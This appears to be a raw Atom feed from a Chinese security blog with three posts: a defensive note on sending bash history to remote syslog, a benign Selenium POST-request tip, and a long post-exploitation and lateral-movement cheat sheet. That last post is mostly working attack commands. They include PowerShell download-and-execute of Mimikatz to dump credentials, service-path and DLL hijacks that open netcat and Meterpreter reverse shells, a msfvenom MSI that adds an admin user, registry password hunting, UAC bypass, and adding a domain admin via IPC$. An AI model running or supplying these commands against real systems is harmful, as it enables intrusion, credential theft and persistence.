要使配置立即生效请执行source /etc/profile，我们再查看history记录，可以看到记录中带上了命令执行时间。

如果想要实现更细化的记录，比如登陆过系统的用户、IP地址、操作命令以及操作时间一一对应，可以通过在/etc/profile里面加入以下代码实现

export HISTTIMEFORMAT=&quot;%F %T 'who -u am i 2&amp;gt;/dev/null| awk '{print $NF}'|sed -e 's/[()]//g ''whoami' &quot;，注意空格都是必须的。

修改/etc/profile并加载后，history记录如下，时间、IP、用户及执行的命令都一一对应。

通过以上配置，我们基本上可以满足日常的审计工作了，但了解系统的朋友应该很容易看出来，这种方法只是设置了环境变量，攻击者unset掉这个环境变量，或者直接删除命令历史，对于安全应急来说，这无疑是一个灾难。

针对这样的问题，我们应该如何应对，下面才是我们今天的重点，通过修改bash源码，让history记录通过syslog发送到远程logserver中，大大增加了攻击者对history记录完整性破坏的难度。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2、修改bash源码，支持syslog记录&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;首先下载bash源码，可以从gnu.org下载，这里不做详细说明了，系统需要安装gcc等编译环境。我们用bash4.4版本做演示。

修改源码：bashhist.c

修改源码config-top.h，取消/#define SYSLOG_HISTORY/这行的注释

编译安装，编译过程不做详细说明，本文中使用的编译参数为： ./configure –prefix=/usr/local/bash，安装成功后对应目录如下：

此时可以修改/etc/passwd中用户shell环境，也可以用编译好的文件直接替换原有的bash二进制文件，但最好对原文件做好备份。

替换时要注意两点:

1、一定要给可执行权限，默认是有的，不过有时候下载到windows系统后，再上传就没有可执行权限了，这里一定要确定，不然你会后悔的；

2、替换时原bash被占用，可以修改原用户的bash环境后再进行替换。

查看效果，我们发现history记录已经写到了/var/log/message中。

如果要写到远程logserver，需要配置syslog服务，具体配置这里不做详细讲解，大家自己研究，发送到远端logserver效果如下图所示。

通过以上手段，可以有效保证history记录的完整性，避免攻击者登录系统后，通过取消环境变量、删除history记录等方式抹掉操作行为，为安全审计、应急响应等提供了完整的原始数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;后记&quot;&gt;后记&lt;/h4&gt;

&lt;p&gt;本文将持续更新，将作者遇到的一些应急的内容和技巧添加到里面，其中有部分内容参考了各大安全论坛的资料，再次感谢其他作者的付出。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="pentest" /><summary type="html">在我们工作过程中，难免会遇到一些需要应急响应的事件。在紧急情况下，某些平时的苦工可能会帮助我们简化流程。这里做下应急方面的笔记，列出一些实用的小技巧。</summary></entry><entry><title type="html">关于selenium的post方法思考</title><link href="/spider/2018/04/18/selenium-post-func/" rel="alternate" type="text/html" title="关于selenium的post方法思考" /><published>2018-04-18T00:08:18+08:00</published><updated>2018-04-18T00:08:18+08:00</updated><id>/spider/2018/04/18/selenium-post-func</id><content type="html" xml:base="/spider/2018/04/18/selenium-post-func/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;Selenium是一款比较常见的web应用自动化测试系统，它支持多种浏览器，多用于在爬虫中解决JavaScript渲染问题。&lt;/strong&gt;&lt;/span&gt;
	
&lt;/p&gt;

&lt;p&gt;当requests，urllib*无法正常获取网页内容的时候，用它模拟浏览器进行网页加载，可以得到一些无法直接在网页源代码里面看到的内容。&lt;/p&gt;

&lt;p&gt;利用selenium及其相关的库，笔者大概尝试过搭配headless chrome、headless firefox，以及快要凉凉的过气选手phantomjs。这几种无界面浏览器当然各有千秋，这里不做过多评论。&lt;/p&gt;

&lt;p&gt;由于selenium原生代码似乎是不带post方式的，故此在测试用例时，很是费了一些精力。在这里，笔者会以headless firefox模式为例，简单谈一下在selenium下如何进行post数据。&lt;/p&gt;

&lt;h4 id=&quot;第三方库&quot;&gt;第三方库&lt;/h4&gt;

&lt;p&gt;以seleniumrequests为例，这个库是一个selenium扩展，使得selenium下也可以使用requests的功能，我们可以采用pip安装：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip install selenium-requests
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;当然，这个库使用起来也是很简单的：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# selenium.webdriver from the seleniumrequests module
from seleniumrequests import Firefox

# Simple usage with built-in WebDrivers:
webdriver = Firefox()
response = webdriver.request('GET', 'https://www.google.com/')
print(response)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;不过这个库也有它的缺点，不方便自定义一些驱动参数，无法设置headless状态（也许是我没找到方法）。有兴趣的朋友可以自行研究下，其支持方法如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; dir(seleniumrequests)
['Android', 'Chrome', 'Firefox', 'Ie', 'Opera', 'PhantomJS', 'Remote', 'RequestMixin', 'Safari', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '__path__', '__warningregistry__', 'request']
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;想象一下画面，爬一次页面弹就会给你弹一个浏览器出来，这TM真酸爽。&lt;/p&gt;

&lt;h4 id=&quot;html点击大法好&quot;&gt;HTML点击大法好&lt;/h4&gt;

&lt;p&gt;个人不太喜欢这种法子，不过好像有一部分人比较推崇。其原理是解析post请求后，将其传递的参数重构为form表单，最后再将这些新生成的代码存入html网页。&lt;/p&gt;

&lt;p&gt;最后，会再借用selenium定位submit元素，触发事件提交表单。&lt;/p&gt;

&lt;p&gt;窃以为这种方法不太妥帖，每开一个网页程序就得生成一个新的html文件。先不论程序是否一定具有写入和删除的权限，如果运行的次数增多后，明显会增加机器负担。&lt;/p&gt;

&lt;h4 id=&quot;ajax代行天子令&quot;&gt;Ajax代行天子令&lt;/h4&gt;

&lt;p&gt;Ajax模拟post发送请求，这是笔者自己采用的办法。当然，不一定是最好的。&lt;/p&gt;

&lt;p&gt;无论是原生JS的XMLHttpRequest，还是Jquery，都可以模拟生成ajax post请求，最后再借助selenium执行JS代码。&lt;/p&gt;

&lt;p&gt;XMLHttpRequest示例片段：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;brower = webdriver.Firefox(firefox_options=fireFoxOptions)
js = &quot;&quot;&quot;var xmlhttp=new XMLHttpRequest();
        xmlhttp.open(&quot;GET&quot;,&quot;http://127.0.0.1/phproot/echo.php&quot;,false);
        xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
        xmlhttp.setRequestHeader(&quot;X-Forwarded-For&quot;,&quot;test&quot;);
        xmlhttp.setRequestHeader(&quot;Referer&quot;,&quot;test&quot;);
        xmlhttp.setRequestHeader(&quot;User-Agent&quot;,&quot;Mozilla/5.0&quot;);
        xmlhttp.setRequestHeader(&quot;Cookie&quot;,&quot;&quot;);
        xmlhttp.send(&quot;test=1&quot;);
        return xmlhttp.responseText;
	    &quot;&quot;&quot; 
brower.implicitly_wait(30)
#time.sleep(30)
resp = brower.execute_script(js)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Jquery示例片段：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jquery = open(&quot;jquery.min.js&quot;, &quot;r&quot;).read()

driver = webdriver.Firefox(firefox_options=fireFoxOptions)
driver.execute_script(jquery)

ajax_query = '''
            $.ajax('%s', {
            type: %s,
            data: %s, 
            headers: { &quot;User-Agent&quot;: &quot;Mozilla/5.0&quot; },
            crossDomain: true,
            xhrFields: {
             withCredentials: true
            },
            success: function(){}
            });
            ''' % (url, request_type, data)

ajax_query = ajax_query.replace(&quot; &quot;, &quot;&quot;).replace(&quot;\n&quot;, &quot;&quot;)
resp = driver.execute_script(&quot;return &quot; + ajax_query)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;但这样做还是有缺陷，通过driver.get预访问一次将要请求的URL，我们能解决跨域的问题。&lt;/p&gt;

&lt;p&gt;但是由于w3g的安全设定，我们无法自行在JS中预置cookie（可以通过传递解决）、Referer等等危险的头部参数。&lt;/p&gt;

&lt;p&gt;如若我们需要fuzz请求包头部一些冷门的参数，这样使用就会有一定的局限性。&lt;/p&gt;

&lt;h4 id=&quot;尾声&quot;&gt;尾声&lt;/h4&gt;

&lt;p&gt;总而言之，selenium没有自带原生post方式是一个遗憾，而且其调用headless模式的浏览器，渲染和启动也显得太慢了些，无法用于高并发。&lt;/p&gt;

&lt;p&gt;还是那句话，个人觉得在资源有限的情况下，它不太适用于高并发的大规模测试，fuzz指定的一定量payload也许尚可。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="spider" /><summary type="html">Selenium是一款比较常见的web应用自动化测试系统，它支持多种浏览器，多用于在爬虫中解决JavaScript渲染问题。</summary></entry><entry><title type="html">内网横向与后渗透辞典</title><link href="/pentest/2018/01/18/pentest-innet-and-permission-maintenance/" rel="alternate" type="text/html" title="内网横向与后渗透辞典" /><published>2018-01-18T01:14:18+08:00</published><updated>2018-01-18T01:14:18+08:00</updated><id>/pentest/2018/01/18/pentest-innet-and-permission-maintenance</id><content type="html" xml:base="/pentest/2018/01/18/pentest-innet-and-permission-maintenance/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;在内网横向与后渗透的过程中，会有一些细节比较蛋疼。而真正系统地讲述内网和后渗透的书籍，也就那么寥寥几本，就算想掏大美刀也没地儿买去。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;换而言之，无论做什么都需要积累。在这篇文章中，鄙人将根据个人库存和网上参考资料做一些总结。&lt;/p&gt;

&lt;p&gt;学无止境，我在以后还会做一些引用和补充，希望能提升自我和帮助有缘人。&lt;/p&gt;

&lt;h3 id=&quot;取得突破口&quot;&gt;取得突破口&lt;/h3&gt;

&lt;p&gt;在外网进入内网时，我们可能需要一个突破口，可能会存在以下几种情况：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;通过SQL注入获取shell。&lt;/li&gt;
  &lt;li&gt;通过命令执行获取shell。&lt;/li&gt;
  &lt;li&gt;通过前后台上传恶意脚本直接获取webshell&lt;/li&gt;
  &lt;li&gt;通过上传解析进行命令执行（csv、xml和shtml等）。&lt;/li&gt;
  &lt;li&gt;通过未授权代理和弱/默认口令VPN获取入口。&lt;/li&gt;
  &lt;li&gt;通过CSRF写shell。&lt;/li&gt;
  &lt;li&gt;通过XSS作为代理，探测内网。&lt;/li&gt;
  &lt;li&gt;钓鱼获得shell。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;提取信息&quot;&gt;提取信息&lt;/h3&gt;

&lt;h5 id=&quot;windows信息提取&quot;&gt;Windows信息提取&lt;/h5&gt;

&lt;p&gt;查看基本信息：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set | systeminfo (环境变量及补丁信息)
systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;

#(已知的主机名/是否开启默认共享/有无特殊服务)
#此处可以加上 /domain
net users | net view | net share | net start |net group 

#查看加入到域内的所有计算机名
net group &quot;domain computers&quot; /domain 

#查看域控制器
net group &quot;domain controllers&quot; /domain 

#查看指定用户
net user hacker /domain

#获得域密码策略设置，密码长短，错误锁定等信息
net accounts /domain 


route print 查看路由
arp -A 查看路由表

netstat -ano | tasklist /svc (查看进程所开端口)

query user (当前在线的用户状态)

schtasks /query /fo LIST /v 查看计划任务

net user administrator
(查看最近更改密码时间，有可能只是在原密码的基础上做了简单变换, 比如把xxx@2016换成xxx@2017)

netsh firewall show state | netsh firewall show config | netsh advfirewall firewall show rule name=all (cmd下查看防火墙配置)

手动到处翻翻翻：
txt/doc/xls/ppt

查询含有特定文件名和内容的文件：
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

注册表里查询：
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

#能得到部分工作站和域敏感信息
net config workstation

#有正确返回则为域用户
net time /domain


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;枚举提权：&lt;/p&gt;

&lt;p&gt;一般是通过脚本枚举补丁，然后输出MS-***，市面上工具比较杂，这里不一一列举。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;

https://github.com/GDSSecurity/Windows-Exploit-Suggester

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h5 id=&quot;linux信息提取&quot;&gt;Linux信息提取&lt;/h5&gt;

&lt;p&gt;查看基本信息：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps auxfww (查看进程详细信息)
netstat -tlnp (所有监听的TCP端口)
netstat -antp | ss -antp (所有活动的TCP连接, 分析哪些IP与当前主机有关联)
cat /etc/issue /etc/*release /proc/version (系统版本信息)
cat /etc/passwd (查看用户配置, 哪些用户可以登陆系统)
cat /etc/hosts (主机名解析配置, 一般这里的IP都是跟当前主机关联度比较高的)
cat /etc/resolv.conf (查看DNS服务器IP, 内网DNS服务器存在域传输漏洞的可能性较高)
id; uname -a; hostname; w; who; lastlog
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;查看敏感信息【也用于应急】：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /root/.bash_history | grep -Ei -C 2 'ssh|mysql|ftp|scp|su|root|passwd' (过滤历史命令记录中的敏感关键字,显示上下各两行)
loacte passwd; locate shadow; locate config.*(properties等配置文件后缀); locate .bash_history; locate .mysql_history; locate authorized_keys
find / -perm +6000 -ls 2&amp;gt;/dev/null | grep -v proc (查找具有SUID/SGID权限的文件和目录)
find / -writable -ls 2&amp;gt;/dev/null | grep -v proc (查找对当前用户具有写权限的文件和目录)
cat /etc/crontab (计划任务中的执行脚本是否有修改权限)
sudo -l (查看当前用户具有哪些sudo权限)
sudo -V (某些版本的sudo存在提权漏洞)
ls -latr /etc/ (查看哪些配置文件最近被修改过)
ls -l /etc/shadow* (查看shadow文件是否有备份, 权限配置是否正确)
cat /etc/security/opasswd (保存了曾经使用过的密码hash)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;内核提权：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CentOS 2.6.32 (2013年之前)
https://www.exploit-db.com/exploits/25444/
CVE-2010-3847 (RHEL5版本)
https://www.nigesb.com/cve-2010-3847-exp-centos.html
https://www.exploit-db.com/exploits/25444/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;枚举提权：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit (本地搜索漏洞库)
linuxprivchecker.py (自动检测提权漏洞的脚本)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h5 id=&quot;密码获取&quot;&gt;密码获取&lt;/h5&gt;

&lt;p&gt;注册表读取自动登陆帐户密码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(cmd) reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;
(msf) post/windows/gather/credentials/windows_autologin
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;powershell篇：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.Empire 【综合渗透工具，类似于msf】
可以生成木马，信息收集，提权，横向渗透以及后门
https://github.com/EmpireProject/Empire.git

2.PowerUp 提权神器
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://192.168.31.247/PowerUp.ps1');Invoke-AllChecks”
powershell -exec bypass -Command &quot;&amp;amp; {Import-Module .PowerUp.ps1; Invoke-AllChecks}&quot;

3.PowerView 域渗透神器
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;powershell读取系统密码【示例，需要xp和2003以上的系统才自带powershell】：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds&quot;
powershell.exe -exec bypass -Command &quot;&amp;amp; {Import-Module .\powerview.ps1;Invoke-UserHunter}&quot;
powershell===&amp;gt;Import-Module .\powerview.ps1 ===&amp;gt;Invoke-UserHunter
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;导出系统密码或者hash,在导出域hash部分有详细介绍：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter/mimikatz/pwdump7/wce/Getpwd_k8/QuarksPwDump
https://github.com/gentilkiwi/mimikatz/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;重启记录密码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;更新KB2871997补丁后，可禁用Wdigest Auth强制系统的内存不保存明文口令。这时需要修改注册表键值，启用Wdigest Auth，自动锁屏，等待用户重新登录判断当前锁屏状态，用户解锁登录后立即导出明文口令：
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Meterpreter获取所有用户的hash：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.msf有两个模块可以使用，一个是hashdump，此模块只能导出本地的hash，大家测试就可以知道了，另外一个是smart_hashdump,此模块可以用来导出域用户的hash。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;powershell有可以直接导出的模块，大家自行尝试一下。&lt;/p&gt;

&lt;p&gt;win2012修改注册表，再次登录可获取密码：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;需要HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest的”UseLogonCredential”设置为1，类型为DWORD 32才可以，然后下次用户再登录，就能记录到明文密码了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;在不存在该字段时，添加UseLogonCredential就行。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;导出部分重要第三方软件密码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;k8getteamviewpwd
http://qqhack8.blog.163.com/blog/static/11414798520156543210624/

浏览器密码读取（多种）

多种读取密码工具
http://www.nirsoft.net/

Teamview读取密码工具【吐司版】

winscp还原明文密码
post/windows/gather/credentials/winscp

Get-GPPPassword(PS)
获取AD域中SYSVOL和组策略首选项中的密码
https://xianzhi.aliyun.com/forum/topic/1653/

Unattended Installs
自动安装允许程序残留xml，全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中。除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件：

C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\

MSF module：post/windows/gather/enum_unattend
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;LAPS获取密码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://wooyun.jozxing.cc/static/drops/tips-10496.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在线破解hash网站：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.objectif-securite.ch/en/ophcrack.php
http://www.cmd5.com
这尼玛太少了，谁帮我加点。

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;离线破解：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ophcrack/hashcat/john the ripper

hashcat 可以组合字典破解，还可以根据规则处理字典
https://hashcat.net/wiki/doku.php?id=mask_attack
/usr/share/hashcat/rules/ 目录存放了默认的规则文件。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;win提升权限&quot;&gt;Win提升权限&lt;/h3&gt;

&lt;p&gt;检查是否存在可以提权的第三方应用：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serv-u/filezilla/flashfxp/winscp/mysql/mssql/radmin
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;服务配置不当提权：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;有的服务以system权限运行, 但是权限配置不当, 导致普通用户可以通过 sc config 修改程序路径。

wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;

查看权限
#这个也行
icacls &quot;C:\Program Files (x86)\Privacyware&quot;

sc qc Spooler【某示例程序】
accesschk.exe -ucqv Spooler
accesschk.exe -ucqv *

===================================
#正题在下面
accesschk.exe -uwcqv &quot;Authenticated Users&quot; *
#结果查出来是upnphost
accesschk.exe -ucqv upnphost

sc qc upnphost
sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;
sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;
sc qc upnphost
net start upnphost
#弹出shell

#测试是否everyone有权限
icacls &quot;C:Program Files\Program Folder\A Subfolder\OmniServers.exe&quot;
#Install-ServiceBinary模块，通过Write-ServiceBinary写一个C#的服务用来添加用户:
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Install-ServiceBinary -ServiceName 'OmniServers'-UserName shuteer -Password Password123!


#提权成功以后我们需要清除入侵的痕迹，把所有的状态恢复到最初的状态，可以使用如下命令恢复：
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Restore-ServiceBinary -ServiceName 'OmniServers'

#漏洞利用原理：该漏洞产生的原因是因为用户开启了windows installer特权安装功能:
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1'); Get-RegistryAlwaysInstallElevated
#检测注册表是否设置，得到true【好像False也能继续】
运行Write-UserAddMSI模块，运行后生成文件UserAdd.msi
#普通用户运行：
msiexec /q /i UserAdd.msi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;劫持提权:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;有的服务程序路径包含空格, 且路径没有被引号包含, 利用Windows寻找可执行文件的顺序, 劫持启动自定义程序。
http://www.greyhathacker.net/?p=738
http://www.freebuf.com/vuls/87463.html

echo %path%
accesschk.exe -dqv &quot;C:\Python27&quot;
cacls &quot;C:\Python27&quot;

msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D &amp;gt; 
/root/Desktop/evil.dll
copy evil.dll C:\Python27\wlbsctrl.dll
#重启生效

#也可以看看计划任务里有没有可疑目录
#比如出现了
#Task To Run:        E:\GrabLogs\tftp.exe 10.1.1.99 GET log.out  E:\GrabLogs\Logs\log.txt
accesschk.exe -dqv &quot;E:\GrabLogs&quot;
msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' O
msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' R | msfencode -t
exe &amp;gt; /root/Desktop/evil-tftp.exe
copy evil-tftp.exe E:\GrabLogs\tftp.exe

#命令行下第一次运行需要同意一个许可，如果不想出现那个提示窗口，则可以执行：
accesschk.exe /accepteula

#找弱权限目录
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\

##找弱权限文件
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*


SC创建服务执行
1、系统权限(其中test为服务名)
sc \\DC1 create test binpath= c:\cmd.exe
sc \\DC1 start test
sc \\DC1 delete test

2.指定用户权限启动
sc \\DC1 create test binpath = &quot;c:\1.exe&quot; obj= &quot;centoso\administrator&quot; passwrod= test
sc \\DC1 start test

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;AlwaysInstallElevated：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;AlwaysInstallElevated是微软允许非授权用户以SYSTEM权限运行安装文件(MSI)的一种设置。然而，给予用于这种权利会存在一定的安全隐患，因为如果这样做下面两个注册表的值会被置为”1”。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;查询命令如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Note：如果这条命令出错类似于：”The system was unable to find the specified registry key or value”，这可能是组策略里AlwaysInstallElevated没有被定义，因此不存在相关联的注册表项。&lt;/p&gt;

&lt;p&gt;现在我们假设AlwaysInstallElevated已经启用了，我们可以利用MSFVenom工具来生成一个在目标机器上增加管理员用户的MSI安装文件：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;当我们在目标机器上加载了新生成的MSI文件后，我们可以使用Windows命令行工具Msiexec进行安装：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Note:使用MSFVenom创建MSI文件时使用了always_install_elevated模块，那么在安装过程中会失败。这是因为操作系统会阻止未注册的安装。&lt;/p&gt;

&lt;p&gt;下面的模块效果相同：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exploit/windows/local/always_install_elevated
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;使用Veil生成免杀payload：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;这个按照提示走就行了，具体的查查资料。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;msf在meterpreter下的bypassuac尝试：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/windows/local/bypassuac_eventvwr
#seach bypassuac
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Meterpreter的post模块使用：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;全都是后渗透模块，search post可得部分，在获取一定权限的session后，直接run即可。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;迁移进程获得权限：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS 查看域管理所在的进程
Migrate pid注入进程
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;从IPC$到域控【尼玛这得多好的运气】：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;继续经典的IPC$到域控

Meterpreter下面shell

Net use \\域控ip\c$

Net time \\域控ip

Copy bat.bat \\域控ip\c$

At \\域控ip time c:\bat.bat

通往成功的路不只有一条，添加域管账户

Net user demo demo /ad /domain

Net group “domain admins” demo /ad /domain

到了此刻，我们已经拥有域管权限了
